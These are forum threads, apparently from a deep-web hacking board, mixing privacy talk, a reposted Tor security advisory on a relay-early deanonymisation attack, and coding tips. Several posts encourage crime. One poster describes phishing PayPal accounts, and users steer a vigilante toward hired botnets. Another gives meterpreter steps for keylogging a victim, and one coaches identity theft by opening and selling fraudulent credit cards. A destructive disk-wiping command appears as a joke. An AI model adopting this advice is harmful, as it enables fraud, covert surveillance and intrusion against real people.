So... I did a bit of research and found out that if you sent an HTTP request with an "old" HTTP 1.0 request, it redirects to another (surely fake) wiki: n6pbizsbykwxmydz.onion . Details follow:----------BEGIN REQUEST----------GET / HTTP/1.0HTTP/1.1 302 FoundDate: Mon, 19 May 2014 16:37:22 GMTServer: Apache/2.4.9 (Fedora) PHP/5.5.12X-Powered-By: PHP/5.5.12Set-Cookie: PHPSESSID=6dgk6e2hrcsejq5398hliifr73; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheLocation: http://n6pbizsbykwxmydz.onion/Content-Length: 0Connection: closeContent-Type: text/html; charset=UTF-8---------END REQUEST----------Now on the main page it says that you can edit the main page if you are registered for at least five days, which means they now have a live mediawiki backend. If anyone knows a mediawiki vuln and could hack in, that would be nice :PEdit: This also works for other servers with the same request... Could we create a blacklist from that?
Bump, more people need to see this.
Bump, this really got pushed down...
Lemme just leave this here.
Why not register a .bit domain and post the onion address on it? That way even if the private key to the onion domain gets stolen, or the service provider decides to change the onion address, the .bit domain can be used to let the users know what the real address is. intelexchange.bit, sound good?
You shall be bumped!
Yay!I had sorta forgotten about this. Any statistics regarding the situation? Has the amount of users being misdirected decreased? I know there's a group dedicated to this on Galaxy, but I never registered an account there.

Long ago, I got the idea of trying to send some spam, so I found a mailer+a mailist before setting up everything and sending some scams. And as expected some were trapped so I got their PayPal accounts. But I didn't use them to steal their money, all I did was just experimental, since at the time I had no idea how to keep everything safe and anonymous. And I still don't know, can anyone provide me with some reference as to how? (this is a reference request for future spammers, I'm so out of that business now)By the way I read somewhere that spammers can get 18$ per post in Facebook (pubs) but how to get into that business, i.e. how to find someone who wants to get his stuff publicized?
Is there any site that has a database of viruses/malware that can be downloaded? I was hoping to do some testing with them on some virtual machines to improve my own security skills but every site that seems to be promising either gives definitions or is dead.
Sounds like you can use something like Kali.
I found a 4 GB collection on piratebay. Search "Virus Collection" and it is titled "VX_Heavens_Virus_Collection".Maybe that will help
Please bear in mind that everything is true and all help i will be grateful for however certain parts of this will be edited or left out to protect peoples anonimity.So i am a teacher at a school and on of our pupils has maneged to get a stalker who will not leave her alone on any social media site and wen blocked will create a new account and start from here they left off the stalker is not violent he is just persistant and collects any photo of the pupil he can find the stalker maneged to find the pupil as they had over 2000 followers many of whom they did not fully know.i have considered making a blog trap to try and find there ip adress and use that to try and track them down the main social media services are  facebook and instagram any help is greatly appreciated. however keep in mind i will not divulge any information about the pupil or about anything that will lead you to the identiy of the pupil such as the stalkers account name.Thank you for your help O-Neil  
Click on this it should get you started. 
Here's another of the same. Get 'em tiger.
I have googled it but i can't wrap my head around any of it cause there are different sources saying different things. I was wondering if anyone here could help install BackBox on to an 8GB SD Card ??
Did you bother to read the manual?
DeepSerenity, have you tried tails? a lot easier to get set up and running on an SD card.
Sorry Valis, I've been away for a while. I did but it confused the hell out of me. After looking at it closer I kind of get the jist of it. Generic, I have actually. I have 2 SD card so on one I'm putting BackBox and on the other I'm putting on tails :)
sudo dd if=/dev/zero of=/dev/sda Install freebsd(Backbox is kinda cool though...(as a VM))
Manual??? Is that  the thing keeping my table leg from rocking....lol  Sorry, couldn't resist!!
@DeepSerenity: Installing OS over SD card will make thing complicated to boot over it. Most system do not support booting over SD card since drivers must be loaded to access the card reader prior to OS boot...However it is possible, but USB stick might be a better option.
I'm actually working on a full system but trying to base it of tails instead. I will post results and how to's here soon.
Hey y'all. So, I don't to be spoon-fed or whatever, (though that would be nice) but I have recently wanted to learn about phreaking. I'm not entirely sure where to start, to be honest. Do any of you know where I can look?
As far as I know, the term Phreaking came from Phone Phreaking which was very popular in the 90's, if we are referring to the same thing that is. It generally means to study or tinker with phone systems, most of this information is outdated and does not apply to today's phone systems, but here are some links with further information, you might be able to salvage some useful information from it.Cellular PhreakingA NEWBIES GUIDE TO PHREAKING IN THE '90sThe Official Phreaker's Manualphreaking tutorialElevator PhreakingThe Technical Book of PhreakingPhreaking the NEC i-Series phone systemsTHE PHREAKER'S HANDBOOK #1
Recently a lot of NSA surveillance equipment has been discovered, one reason is Snowden and another is hacktivists. Since NSA (probably) didn't expect those tools to be found, wouldn't it be fairly simple to find a flaw in one of their many systems? Sending a harmful payload back to their servers? I'm not that advanced in the subject yet but I'm just trying to give you some ideas... There has to be some kind of way.

What if its all obsolete, and hardware isn't required to do anything anymore. It would make all of the recently surveillance ranting part of the gameplan.
This is also something else that can't be stressed enough...Counter Cyber Forensics,in other words leave no trace...Attacking the NSA is a bit beyond a burn laptop and public WIFI.There literally watching your every move...(1984 good read)@KorruptorThere is a theory going around that supports that.I don't give this much credit,but think what you want.Here it is:Snowden was betrayed by the NSA because he was planing to leak something bigger....The only reason I discredit this is what could be bigger than the NSA spying on Americans?
@gunnerzz:Q: What could be bigger than the NSA spying on Americans?A: What we are exposing here: bankers killing the world.
@ZyxI don't know that's why I discredit that theory...Even if it does make since to some degree.
Well right off hand I would say what could be bigger than the NSA spying on Americans is that: N...S...A... actually stands for the New World Order Surveillance Agency, instead of the National Security Agency, and about who they actually report to. 
I'm still 50/50 on believing Snowden and I'm still trying to figure out which side Julian Assange and Wikileaks are on...lol
I am new to hacking, mostly on Intel Exchange to ask questions and to read about conspiracy questions. Anyways, this should be an easy question for you guys to answer but I thought IP addresses were all numbers. How could someone's IP address be things like 2601:e:1480:4:21fc:a899:472d:b5a2, 2601:e:1480:4:f5b4:9511:38ca:6197, and 2601:e:1480:4:2aef:1ff:fe46:6eea without using Tor? Also, what all can you do with someone's old IP addresses? Any possible way to still hack into their stuff? FYI, the reason I want to do this is because I found out the guy has been looking at child pornography for years and I want to simply get revenge as I don't stand for that. I was able to get his IP address, but not much more. I also have the number one, but was confused why these number and letter ones showed up also. Also, if it shows the TTL as 2 hours, what does that mean? thanks guys and sorry for the bother. Edited: How do I make a ddos attack and would anyone be willing to help? 
What you posted looks like an IPv6 address. An IPv6 consists of 8x4 hexadecimal digits (0-9 + a,b,c,d,e,f) separated by a colon (:). You can get more info here, but if the visitors IP isn't static (staying the same over some time), you don't have a good chance.... The best would be to contact the visitors ISP and report it to him, but they'll probably ask questions how you got that IP...Good luck chasing that asshole down >-)
Even with the number IP, I couldnt have a good chance? I'm hoping to get into his computer, find other people who have looked at CP, and crash all of them to teach the fuckers a lesson! 
TTL is Time To Live. What it refers to depends on what field you found it. I don't think it would refer to the IP. For a DDoS attack, you need a botnet, which you can spend days/months building, or find one for hire. For a DoS attack, you can try downloading and using a tool, but be wary of malware.
Zyx, have you already built a DDos botnet that I could use or is there any way to find any on the deep web?
I'm not revealing what I have. 
I'd be willing to pay, just don't trust many Deep Web hacking websites with my BitCoins. 
Not to be rude, if you're not good at it, don't try to hack, or you could end yourself up in incarceration for 20+ years.First, get a background in the information tables field, then programming, then move to ethical hacking, then activism. Trust me, I seriously recommend you just leave it to someone else.
I don't take on any jobs on the DW, and in RL, no one knows I hack. Basically, my tools are for personal use. And I haven't said I have a botnet, not gonna deny it either.Someone else might offer theirs in this thread while you search, so don't despair. If you're gonna hire it, try to find a cheap service, or one that offers previews, like the one reviewed in that link.And yes, what REDACTED wrote. Hacking in itself is considered a crime in most jurisdictions. Damaging property only adds to it. And it's really easy to be traced if you're not careful.
Zyx, I have Kali Linux if that helps to cover my tracks. I'm able to get email passwords, but that's as best as I can do at this time unfortunately.
Kali is only a set of exploit tools, it won't help you hide. I would really recommend to desist, or if you really must, hire someone else to do it (still dangerous).
What you could do and since you seem to know that a certain someone dwells (or ventured) in a CP site, is to report the site. It's simple, however, do that using an anonymous email service (if you have to) and certainly not from your home connection. Botnet or not, DDOSing a CP site may not solve anything in the long run.Nonetheless, I'd suggest you find information regarding what web servers collect from your machine if you try to access them (pinging them, trying to ddos them or visiting them via your browser).Indeed using exploiting tools (KALI related ones or otherwise) and covering your tracks are separate things (partly quoting Zyx here).
I don't know what site they have used. I just know that they do in fact have thousands of it collected over the years on their computer. I was hoping to DDOS their computer, along with finding other connections to other people who have looked at CP and do the same to them also. 
A DDoS attack is only a temporary disruption, and a noticeable one. It's best if you enter their systems unnoticed, collect sufficient evidence and then send an anonymous tip to LE.
Would entering their system unnoticed be harder than a DDOS attack? And the reason I want to do this so badly is because it's of toddlers, not just children and I just want to take out as many of those bastards as I can.
Yes, much harder. Since you insist, I'd recommend hiring someone else to do it.
I agree, Zyx.While, I don't work for money, I can redirect you to some fellows who will.Sorry if this seems negative, I just don't wanna see a poor guy end up in prison for 20+ years.Again, very apologetic, but I hope that you will take the option of hiring someone into consideration.---REDACTED@[///REDACTED///]
while we are on the botnet topic does anyone know of a link to get ICE IX free looked for it and havent seen anything. Yes its a pretty old tool but I havent heard or read of anything new but if you know of something similiar please share :)
While I know these have nothing to do with eachother most of the time, but you can use them in succession.Feel free to ask questions you have here, & I will try to be speedy, & accurately supply information on them, but please, stay away from self-incriminating information.

Anybody can help me on how to get pass the Ipod/iphone activation lock if it was put as stolen? And No, i personally didnt steal it. A friend did, and he gave it to me because he was being searched for it, and now im stuck with it.... soooo now i have a Ipod Touch 5th Generation that im thinking is potentially just a brick to me.
Nobody has done it yet, good luck. Maybe make one of those "iphone break test" videos with it.
Yes, there are ways to unlock it.There's very long, long guides as to how.
There's some pretty sketchy looking kiosks in busy streets that do it for cash, if you don't feel like learning how. But yes, there are detailed guides on it.
Hello all, its been awhile.Has anyone heard of the DoS tool XerXes developed by th3j3st3r (thejester)? I have no intentions of using it, im not even looking for were i could get it. But does anyone know exactly how it works? Hope everyone has been doing well,K
Fellow I.E. Users. We are in an era where information becomes more and more important. In the past having a picklock set was mandatory. Now making use of Cracking (or hacking stupid media) and plain old hacking are our picklock set. I have come to the realisation that we really lack in that department. So this is my suggestion. Why won't we hone our skills? We need something to have an edge over our enemies. Who wants to learn with me? I am suggesting that we start off small for now. Be it something like setting up backtrack (or kali whatever floats your boat) on our smartphones or just plain old php injections. Because I for one KNOW that I lack in this department. And I am pretty sure that others do too even though they wouldn't come out for it. We can even set up a IRC channel and work with each other on a project. Just something to become better at it. So who wants to learn with me? 
I would love to learn. Just keep in mind that I am a beginner.
The more the merrier. We need all the people we can muster. 
I'd lend my botnet for a while. :)
There is a private server for World of Warcraft (ClearWeb link: worldofcorecraft.com) that decided to teach everybody who is interested C#. They have a course that's held every Saturday (I believe it is also on IRC) and they also have a Google Group. They update a PDF weekly with all the lesson and exercises. So if by any chance you want to learn C# (languages aren't that different anyway) you can always snatch that PDF, it may prove useful.
Hey, could someone give info about a good keylogger (remote access or kernel would be the best)? Would be grateful.
I tried Ardamax Keylogger and it's pretty good, even if a good antivirus software can easily notice it. If you have better alternatives, you are welcome.
Thanks, it looks fair enough.
Use se-toolkit to open a meterpreter session on victims pc, migrate explorer.exe process with its pid, keyscan_start wait then keyscan_dump.
It depends if you want a remote keylogger or a local keylogger. If you physically access the computer often, a local keylogger such as Ardamax will do. If you cant access it, you need a remote keylogger that emails you the logs. I reccomend Reflect Logger [redacted]. Yes, it does look infected but it is not. I have personally made sure it is safe.
@Mods: Can you please revoke the verification of Det0x? Would be nice if we can keep the boards free of the sort of crap posted above...
@Det0x: Trust doesn't work here, do not link to programs anymore, mentioning the name or something is fine, but do not try to infect users of this board. (I removed the link for user safety)@VALIS: If he does it again, I will.
Trust is not important. Unless you register high on the autisim spectrum, you can clearly read that it is detected as a virus because it generates keyloggers and not because its a virus itself. I can now see that this forum is far below my level and apoligize for ever entering it. I would appreciate if my validation would be revoked. I am not trying to infect anyone, I have exploit kits that pull in hundreds of slaves per day and have no need to try to infect people one by one on a forum.
You could just, you know, not come on here anymore Det0x, no need to get upset.
Well, I rooted my phone, and I put a keylogger on it, it helps if I want to steal something from a computer & not seem suspicious by just plugging my phone in.You'll have to add some repositories for your phone to install pre-made keyloggers, if you don't know how to make your own.As I made my own, I know no-one knows about it.Sorry about bumping old threads.
 
Selling those cards is adviceable. You atleast won't risk getting caught. The odds are higher that you will get caught using those things than when you simply sell them. Assuming that you are talking about creditcards. Otherwise please eloborate further on those 'cards'. Thoron.
Well, I have sufficient information to apply for new credit cards, debit cards, medical information, without any problem. Is it of high risk/worth it to apply for a new card?
Hmm... I would just sell the information if it fetches a nice penny. If not you could get those cards on another address far away from you of course. (if possible at the same address of the person to whom the information belongs and try to intercept the cards/information before it comes into their possession, but that would be ridiculously hard). And when you get those cards simply sell them afterwards (they are more worth that way than simply selling the information). If you are really greedy (not adviceable IMO) is to always use those cards yourself and pull out a lot of money (Hide your face and such...). That's about it actually. Thoron.
Ah, thank you. That answered my question.
Are Google and Apple On Your Side?Subverting Device Encryption? Let Me Count the WaysBy Bill Blunden, September 21, 2014In the past couple of days both Google and Apple have announced that they�۪re enabling default encryption on their mobile devices so that only the user possessing a device's password can access its local files. The public relations team at Apple makes the following claim:"Apple cannot bypass your passcode and therefore cannot access this data... So it's not technically feasible for us to respond to government warrants for the extraction of this data from devices in their possession running iOS 8"The marketing drones at Google issued a similar talking point:"For over three years Android has offered encryption, and keys are not stored off of the device, so they cannot be shared with law enforcement... As part of our next Android release, encryption will be enabled by default out of the box, so you won't even have to think about turning it on."Quite a sales pitch? Cleverly disguised as a news report no less. Though it�۪s not stated outright the tacit message is: open your wallet for the latest gadget and you�۪ll be safe from Big Brother. Sadly, to a large degree this perception of warrant protection is the product of Security Theater aimed at rubes and shareholders. The anti-surveillance narrative being dispensed neglects the myriad of ways in which such device-level encryption can be overcome. A list of such techniques has been enumerated by John Young,the architect who maintains the Cryptome leak site. Young asks readers why he should trust hi-tech�۪s sales pitch and subsequently presents a series of barbed responses. For example:Because they can't covertly send your device updated software [malware] that would change all these promises, for a targeted individual, or on a mass basis?Because this first release of their encryption software has no security bugs, so you will never need to upgrade it to retain your privacy?Because the US export control bureaucracy would never try to stop Apple from selling secure mass market proprietary encryption products across the border?Because the countries that wouldn't let Blackberry sell phones that communicate securely with your own corporate servers, will of course let Apple sell whatever high security non-tappable devices it wants to?Because they want to help the terrorists win?Because it's always better to wiretap people after you convince them that they are perfectly secure, so they'll spill all their best secrets?Another thing to keep in mind is that local device encryption is just that. Local. As Bruce Schneier points out this tactic does little to protect user data that�۪s stored in the cloud. When push comes to shove executives will still be able to hand over anything that resides on corporate servers.Marketing spokesmen are eager to create the impression that companies are siding with users in thestruggle against mass surveillance (never mind the prolific corporate data mining). Especially after business leaders denied participating in the NSA�۪s PRISM program. Yet the appearance of standing up to government surveillance is often a clever ployto sell you stuff, a branding mechanism. It�۪s important to recognize that Internet companies, especially billion dollar hi-tech multinationals like Yahoo and Cisco, exist to generate revenue and have clearly demonstrated the tendency to choose profits over human rights when it�۪s expedient.SourceApple and Spy DisbeliefDate: Sun, 21 Sep 2014 05:46:57 +0000From: Jacob Appelbaum <jacob[at]appelbaum.net>To: John Denker <jsd[at]av8n.com>Cc: cryptography[at]metzdowd.comSubject: Re: [Cryptography] new wiretap resistance in iOS 8?On 9/20/14, John Denker <jsd[at]av8n.com> wrote:> On 09/19/2014 09:16 PM, John Gilmore wrote:>> There must be some other reason, I'm just having trouble thinking of it.>> 1) As the proverb says, don't let the perfect be the>  enemy of the good.>>  There will never be perfect security.

Just above you suggest that the enemy of the perfect is the enemy of good enough - it may not be perfect, HTC phones may also be weakened by someone - but if it isn't the NSA, I'd be happy with that as a good solution.

Using your nice iPhone, they'll assist in murdering you.And yes, they also backdoor crypto, actively exploit software and hardware bugs.To that end - the Hobbesian world is already here. With Apple's help, no less. Is it willing? How would we know? Is it coerced? How can we verify?

They are lawless. At best they claim these days that an executive order is the same as a law enacted by Congress. They are literally claiming that EO12333 allows them to do dragnet collection. I've had a senior NSA person tell me that EO12333 allows NSA to collect on the Tor network in the US and outside without exception. This has cost them nothing. Alexander, Clapper and others are all free. They are not punished - they are part of a culture of impunity.The NSA and other "Intelligence Community" members have been doing this for longer than I've been alive. They've been getting caught for ages and no reform has changed anything except in public perception that it is happening at all.

Thank you, Zyx. You've added many new interesting reads to allow this forum to come alive again!
In the beginning of Google's creation, its makers intended it to be purely a search engine which would allow web users to browse the world wide web's content quicker and more efficiently, all for free. Unlike Microsoft, Google ventured into business not because of the love of money, but in order to sustain it's growing and costly operations. It's ironic to think that its creators used to be opposed to web advertising.Now, Google is a towering giant in the corporate world of business and transactions. I'd like to think that Google is still "good" in retrospect to their humble beginnings and noble aspirations. However, I am aware that such thinking is downright wishful and a hallmark of naivety. Perhaps Google has already turned evil.As for Apple, I have never been a fan of their endeavors. Steve Jobs was not a good person, but he wasn't necessarily evil either. He was a man who believed that the end justifies the means and would be willing to sacrifice his own soul in order to achieve his desire, an ideal reflected by the corporations he founded.Apple and Google's stance and movements towards "protecting" their consumer's privacy are dubious at best. I find that the only way to protect yourself is to limit, if not eliminate, your digital footprints in the matrix we now call the world wide web. However, I could be wrong. I hope I'm wrong...
Unfortunately, you are correct.When Google first came out, I was excited to see such a company growing. At some point, they were corrupted, and now I try to stay away from their services as much as possible (YT included). Apple... Yeah... Pure evil.
Greetings. I would like to ask about a reliable method of tracing a cellular number's location without me calling or replying to the specific number and revealing myself. A family member of mine received several text messages which borders on harrassment and are obviously scams to have the victim reveal their identities for profit. I wish to turn the tables on these scammers and teach them a thing or two. I don't want to hurt them. I just want to beat them in their own game.I have searched the clearweb for instructions on how to do this but the methods procured by search engines seem unreliable. Any help regarding this matter would be greatly appreciated.
Ill leave the hacking part of it to the professionals. I believe the keywords of your research should be triangulation and trace. I just wanna suggest 2 thing you could try in the mean time. 1. Download truecaller and try the number on there. It has a database of millions and the moment u download it all ur contacts are automatically added to the database under the names as u have them saved as. 2. Try searching the number on pipl.com. Not always succesful but worth a shot. Good luck!
Thank you for your reply but I doubt I'll download and install Truecaller on my phone. I'm paranoid at the amount of data they'll collect on my phone. The idea is to limit my digital footprint to as minimum as possible if not eliminate it completely. However, I took note of your suggestion regarding triangulation and I think I might request the service providers for that on the next time I call them.
@DantalionGet a burner. A burner phone without a sim is ideal, and you could still use it without a sim. Install the app on that, and head to public wifi.Like many calls, though, if they were smart they'd be relaying their calls through multiple phones, making this very hard to triangulate.At that point there is no "*67" trick or anything to find them, you'll need to try and hop the relays to find them (again though, needs time and they could have ditched the phone at that point).Need to make calls on that burner phone? Phreak.
I should also mention that you'd need to root that burner and run a proxy through it. Via TOR or something else. 
Thanks for the suggestion, Indigo1011. I might experiment with that on one of my phones.
Basically, the NSA knows what you did on Tor for the past five months...From the Tor Blog @ https://blog.torproject.org/blog/tor-security-advisory-relay-early-traffic-confirmation-attackSUMMARY:On July 4 2014 we found a group of relays that we assume were trying to deanonymize users. They appear to have been targeting people who operate or access Tor hidden services. The attack involved modifying Tor protocol headers to do traffic confirmation attacks.The attacking relays joined the network on January 30 2014, and we removed them from the network on July 4. While we don't know when they started doing the attack, users who operated or accessed hidden services from early February through July 4 should assume they were affected.Unfortunately, it's still unclear what "affected" includes. We know the attack looked for users who fetched hidden service descriptors, but the attackers likely were not able to see any application-level traffic (e.g. what pages were loaded or even whether users visited the hidden service they looked up). The attack probably also tried to learn who published hidden service descriptors, which would allow the attackers to learn the location of that hidden service. In theory the attack could also be used to link users to their destinations on normal Tor circuits too, but we found no evidence that the attackers operated any exit relays, making this attack less likely. And finally, we don't know how much data the attackers kept, and due to the way the attack was deployed (more details below), their protocol header modifications might have aided other attackers in deanonymizing users too.Relays should upgrade to a recent Tor release (0.2.4.23 or 0.2.5.6-alpha), to close the particular protocol vulnerability the attackers used ��� but remember that preventing traffic confirmation in general remains an open research problem. Clients that upgrade (once new Tor Browser releases are ready) will take another step towards limiting the number of entry guards that are in a position to see their traffic, thus reducing the damage from future attacks like this one. Hidden service operators should consider changing the location of their hidden service.THE TECHNICAL DETAILS:We believe they used a combination of two classes of attacks: a traffic confirmation attack and a Sybil attack.A traffic confirmation attack is possible when the attacker controls or observes the relays on both ends of a Tor circuit and then compares traffic timing, volume, or other characteristics to conclude that the two relays are indeed on the same circuit. If the first relay in the circuit (called the "entry guard") knows the IP address of the user, and the last relay in the circuit knows the resource or destination she is accessing, then together they can deanonymize her. You can read more about traffic confirmation attacks, including pointers to many research papers, at this blog post from 2009:https://blog.torproject.org/blog/one-cell-enoughThe particular confirmation attack they used was an active attack where the relay on one end injects a signal into the Tor protocol headers, and then the relay on the other end reads the signal. These attacking relays were stable enough to get the HSDir ("suitable for hidden service directory") and Guard ("suitable for being an entry guard") consensus flags. Then they injected the signal whenever they were used as a hidden service directory, and looked for an injected signal whenever they were used as an entry guard.The way they injected the signal was by sending sequences of "relay" vs "relay early" commands down the circuit, to encode the message they want to send. For background, Tor has two types of cells: link cells, which are intended for the adjacent relay in the circuit, and relay cells, which are passed to the other end of the circuit. In 2008 we added a new kind of relay cell, called a "relay early" cell, which is used to prevent people from building very long paths in the Tor network. (Very long paths can be used to induce congestion and aid in breaking anonymity). But the fix for infinite-length paths introduced a problem with accessing hidden services, and one of the side effects of our fix for bug 1038 was that while we limit the number of outbound (away from the client) "relay early" cells on a circuit, we don't limit the number of inbound (towards the client) relay early cells.So in summary, when Tor clients contacted an attacking relay in its role as a Hidden Service Directory to publish or retrieve a hidden service descriptor (steps 2 and 3 on the hidden service protocol diagrams), that relay would send the hidden service name (encoded as a pattern of relay and relay-early cells) back down the circuit. Other attacking relays, when they get chosen for the first hop of a circuit, would look for inbound relay-early cells (since nobody else sends them) and would thus learn which clients requested information about a hidden service.There are three important points about this attack:A) The attacker encoded the name of the hidden service in the injected signal (as opposed to, say, sending a random number and keeping a local list mapping random number to hidden service name). The encoded signal is encrypted as it is sent over the TLS channel between relays. However, this signal would be easy to read and interpret by anybody who runs a relay and receives the encoded traffic. And we might also worry about a global adversary (e.g. a large intelligence agency) that records Internet traffic at the entry guards and then tries to break Tor's link encryption. The way this attack was performed weakens Tor's anonymity against these other potential attackers too ��� either while it was happening or after the fact if they have traffic logs. So if the attack was a research project (i.e. not intentionally malicious), it was deployed in an irresponsible way because it puts users at risk indefinitely into the future.(This concern is in addition to the general issue that it's probably unwise from a legal perspective for researchers to attack real users by modifying their traffic on one end and wiretapping it on the other. Tools like Shadow are great for testing Tor research ideas out in the lab.)B) This protocol header signal injection attack is actually pretty neat from a research perspective, in that it's a bit different from previous tagging attacks which targeted the application-level payload. Previous tagging attacks modified the payload at the entry guard, and then looked for a modified payload at the exit relay (which can see the decrypted payload). Those attacks don't work in the other direction (from the exit relay back towards the client), because the payload is still encrypted at the entry guard. But because this new approach modifies ("tags") the cell headers rather than the payload, every relay in the path can see the tag.C) We should remind readers that while this particular variant of the traffic confirmation attack allows high-confidence and efficient correlation, the general class of passive (statistical) traffic confirmation attacks remains unsolved and would likely have worked just fine here. So the good news is traffic confirmation attacks aren't new or surprising, but the bad news is that they still work. See https://blog.torproject.org/blog/one-cell-enough for more discussion.Then the second class of attack they used, in conjunction with their traffic confirmation attack, was a standard Sybil attack ��� they signed up around 115 fast non-exit relays, all running on 50.7.0.0/16 or 204.45.0.0/16. Together these relays summed to about 6.4% of the Guard capacity in the network. Then, in part because of our current guard rotation parameters, these relays became entry guards for a significant chunk of users over their five months of operation.We actually noticed these relays when they joined the network, since the DocTor scanner reported them. We considered the set of new relays at the time, and made a decision that it wasn't that large a fraction of the network. [VALIS: OMGWTFBBQ?!] It's clear there's room for improvement in terms of how to let the Tor network grow while also ensuring we maintain social connections with the operators of all large groups of relays. (In general having a widely diverse set of relay locations and relay operators, yet not allowing any bad relays in, seems like a hard problem; on the other hand our detection scripts did notice them in this case, so there's hope for a better solution here.)In response, we've taken the following short-term steps:1) Removed the attacking relays from the network.2) Put out a software update for relays to prevent "relay early" cells from being used this way.3) Put out a software update that will (once enough clients have upgraded) let us tell clients to move to using one entry guard rather than three, to reduce exposure to relays over time.4) Clients can tell whether they've received a relay or relay-cell. For expert users, the new Tor version warns you in your logs if a relay on your path injects any relay-early cells: look for the phrase "Received an inbound RELAY_EARLY cell".The following longer-term research areas remain:5) Further growing the Tor network and diversity of relay operators, which will reduce the impact from an adversary of a given size.6) Exploring better mechanisms, e.g. social connections, to limit the impact from a malicious set of relays. We've also formed a group to pay more attention to suspicious relays in the network:https://blog.torproject.org/blog/how-report-bad-relays7) Further reducing exposure to guards over time, perhaps by extending the guard rotation lifetime:https://blog.torproject.org/blog/lifecycle-of-a-new-relayhttps://blog.torproject.org/blog/improving-tors-anonymity-changing-guard...8) Better understanding statistical traffic correlation attacks and whether padding or other approaches can mitigate them.9) Improving the hidden service design, including making it harder for relays serving as hidden service directory points to learn what hidden service address they're handling:https://blog.torproject.org/blog/hidden-services-need-some-loveOPEN QUESTIONS:Q1) Was this the Black Hat 2014 talk that got canceled recently?Q2) Did we find all the malicious relays?Q3) Did the malicious relays inject the signal at any points besides the HSDir position?Q4) What data did the attackers keep, and are they going to destroy it? How have they protected the data (if any) while storing it?Great questions. We spent several months trying to extract information from the researchers who were going to give the Black Hat talk, and eventually we did get some hints from them about how "relay early" cells could be used for traffic confirmation attacks, which is how we started looking for the attacks in the wild. They haven't answered our emails lately, so we don't know for sure, but it seems likely that the answer to Q1 is "yes". In fact, we hope they *were* the ones doing the attacks, since otherwise it means somebody else was. We don't yet know the answers to Q2, Q3, or Q4.
Right! This is reminder that there are no fully reliable systems... and that Tor really bothers the powers at be.
In addition, intensive measures seem to take place forcing mostly stand-alone exit-relays (usually run by volunteers) to withdraw from the ToR network (via "legal" threats, injunctions, lawsuits etc.). TOR maintains a list of Good/Bad ISP's with "Good" and "Bad" being an indication depicting their policy towards running hidden services (such as TOR relays). The list can be found here.
I don't know how to write code i really want to learn because i want to learn to write an APP that will help people in so many ways this is a noble cause andi would ask of those who have experience in this field to either help me directif you can, or post the correct links to knowledge of this subject, (remember am a beginner)links to software,hardware(if needed),proper beginners tutorials,and good links overall as am a NOOB,I have never wrote code and don't understand the language at all,but am willing and eager to learn and have lots of timeon my hands,so please if you have the knowlegde will you and can you help me please just to addTHIS SUBJECT is so close to my heart that i must succeed at all costs,because it's gonna help so many people and NO this wont be a money making APP,its much more than that my intel friends.SO if you think you can help please post here and help out,Thank you all so much in advancei will also reply to everyone,take care and have a great day all.SIG--All that is necessary for the triumph of evil and wrong-doing is that good men and women sit back and do nothing.
Which coding language would you like to learn first there are lots this website has courses for most of them i would start with python its quite user friendly heres the website (clearnet)http://www.codecademy.com/good luck
O-Neil-Which coding language would you like to learn first there are lots? I DID'NT EVEN KNOW THAT,can you explain please in realation to lots,i just want to build an app after learning how to write codeam a beginner let's make no mistakes about that, so to explain and help me out if you and other user's can would be a great for me (LOTS,do you mean windows,IOS,LINUX BY THERE ARE LOTS)BTW THANKS SO MUCH FOR THE LINK,sorry about the caps there,O-neil can you write code?SIG--All that is necessary for the triumph of evil and wrong-doing is that good men and women sit back and do nothing.
When i mean lots i say that because there is no universal language for all coding requirments if your wanting to code for ios you have to learn c++ if you want to learn to make websites html and so on however i would sill reccomend python before c++ as it is more user friendly than others also once you know one language its easyer to learn more.And i can write a bit of code but i have not done apps before.
Also as a side note python helps you learn the code as you dont have to worry about the graphical look of the program
I can code in java and C i have videos and ebooks that can help but I have no idea how to upload them. I'll try to find the youtube link for you on youtube but while you're waiting try searching for bucky on youtube he explains great!
Here you have something to explore (it'll likely take a few hours). Choose well, learning your first language is not so easy and it's time-consuming. It'll change some of your logic processes (for the better). After the first one, the rest are easier.Something that's not mentioned on that page (but it's not so hard to find, so run a web search to understand it better) is the difference between static (source) and run-time [insert whatever action]:- Static means it'll perform the action when interpreting/compiling the code. This happens only once, so it's slower to start (unless compiled, which only happens once before the program's distributed) and faster to execute.- At run-time means it'll perform the action every time when it's needed. This makes it slower during execution, but there's a chance that that part never gets executed at all (potentially faster). This also makes it much more flexible (i.e. data types are allowed to change).As the speed difference is usually negligible (unless it's a massive part of a program, like a monolithic kernel), but the flexibility is noticeable (for the programmer, not the user), I tend to prefer languages that leave things to be done at run-time.
TO O-Neil, TO whitetiger1000, TO Zyx.Thank you all so much for your contributions you have restored my faith in humanity,I love this site there's some really good folks here am delighted to be a member,and so glad am getting help to learn to write code,until o-neil told there's all different types of code i did'nt even know so there am starting to learn :)thank you buddy,and whitetiger1000 i would love those books and defo the video's would so helpful friend,oh btw i looked for bucky but could'nt find him have you a link please.and finally Zyx Thank you so much for your information although to be honest it sort of went over my head as am a complete noobie when it comes to PC codeing and program writing I know nothing but am honest about that,and i have time on my side lots of free time but what you said zyx my friend about learning your 1st language is so true its like learning russian or chinese dear lord computer terminolgy is like another language to learn i have much to learn.so any and all help is so much needed and i hope in time i can contribute back if i am successful in learning how to write code,wish me luck :).so whitetiger1000 them links if you can find them please and bucky who i cant find on utube also Thanks,and anyone else new to this topic i created who can help in anyway please submit thank you in advance,Take care all and have a peaceful week :).SIG--All that is necessary for the triumph of evil and wrong-doing is that good men and women sit back and do nothing.

@whitetiger1000,Thank you friend i followed your link his name is Bucky Roberts, YES THANK GOODNESS :).am going to start accessing the intel iv'e been given Thus far and see were it leads thanks once againfor your help in getting me started and everyone else also i can see this will be time consuming but it will be worth itonce i aquire the knowledge,which i know will take time to learn.If you friend or anyone for that matter remember's anything else to help me along please drop me a few lines,I also feel other membershere om IE will benefit in this subject/topic,This is a great skill to have especially now that we all live more or less in a digitalAge.Take care all :).SIG--All that is necessary for the triumph of evil and wrong-doing is that good men and women sit back and do nothing.
I have a locked Samsung Galaxy Ace IIx that I have locked myself out of. I don't want to factory reset it as I have stuff on it that isn't backed up and I don't want to lose. Is there anyway I could recover the password or bypass it all together to change it?
